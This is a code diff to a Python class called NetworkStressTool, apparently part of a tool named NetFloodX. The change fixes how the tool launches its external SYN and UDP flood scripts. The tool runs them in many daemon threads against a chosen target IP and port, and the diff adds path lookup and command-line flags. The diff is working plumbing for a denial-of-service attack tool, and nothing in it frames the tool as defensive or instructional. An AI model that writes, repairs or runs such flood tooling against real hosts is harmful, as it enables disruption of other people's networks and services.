@@ -70,7 +70,7 @@ class NetworkStressTool:
         if attack_type == 1 or attack_type == 3:  # SYN or both
             print("[*] Starting SYN attack...")
             for _ in range(num_threads):
-                t = threading.Thread(target=self.run_external_script, args=("syn.py",))
+                t = threading.Thread(target=self.run_external_script, args=("Syn.py",))
                 t.daemon = True
                 t.start()
                 self.attack_threads.append(t)
@@ -78,7 +78,7 @@ class NetworkStressTool:
         if attack_type == 2 or attack_type == 3:  # UDP or both
             print("[*] Starting UDP attack...")
             for _ in range(num_threads):
-                t = threading.Thread(target=self.run_external_script, args=("udp.py",))
+                t = threading.Thread(target=self.run_external_script, args=("Udp.py",))
                 t.daemon = True
                 t.start()
                 self.attack_threads.append(t)
@@ -95,9 +95,38 @@ class NetworkStressTool:
     def run_external_script(self, script_name):
         """Run the external script (SYN or UDP attack)"""
         try:
-            subprocess.call(["python3", script_name, self.target_ip, str(self.target_port)])
+            # Get the directory of the current script
+            current_dir = os.path.dirname(os.path.abspath(__file__))
+            
+            # Construct the full path to the script
+            script_path = os.path.join(current_dir, script_name)
+            
+            # Check for different case variations of the filename
+            if not os.path.exists(script_path):
+                # Try with lowercase name
+                lowercase_path = os.path.join(current_dir, script_name.lower())
+                if os.path.exists(lowercase_path):
+                    script_path = lowercase_path
+                else:
+                    # Try with uppercase first letter
+                    capitalized_path = os.path.join(current_dir, script_name.capitalize())
+                    if os.path.exists(capitalized_path):
+                        script_path = capitalized_path
+                    else:
+                        print(f"[!] Error: Could not find {script_name}. Make sure it's in the same directory as NetFloodX.py.")
+                        return
+            
+            # Pass correct command line arguments with flags as expected by the scripts
+            if script_name.lower() == "syn.py":
+                command = ["python3", script_path, "-t", self.target_ip, "-p", str(self.target_port)]
+            elif script_name.lower() == "udp.py":
+                command = ["python3", script_path, "-t", self.target_ip, "-p", str(self.target_port)]
+            else:
+                command = ["python3", script_path, "-t", self.target_ip, "-p", str(self.target_port)]
+                
+            subprocess.call(command)
         except Exception as e:
-            print(f"Error running {script_name}: {e}")
+            print(f"[!] Error running {script_name}: {e}")
 
     def stop_attack(self):
         """Stop all running attacks"""
